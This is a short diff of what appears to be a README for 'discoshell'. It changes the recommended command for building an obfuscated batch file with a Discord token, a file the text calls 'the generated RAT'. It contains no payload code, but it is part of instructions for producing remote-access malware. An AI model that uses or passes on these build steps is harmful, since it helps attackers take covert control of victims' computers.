@@ -19,7 +19,7 @@
 ![image](https://media.discordapp.net/attachments/959762900443070485/969095436939984916/unknown.png)
 
 Recommended configuration:
-discoshell -o output.bat -t {copied token from step 6} -p ! -obf -d
+discoshell -o output.bat -t {copied token from step 6} -obf
 
 9. The outputted batch file is the generated RAT.
 
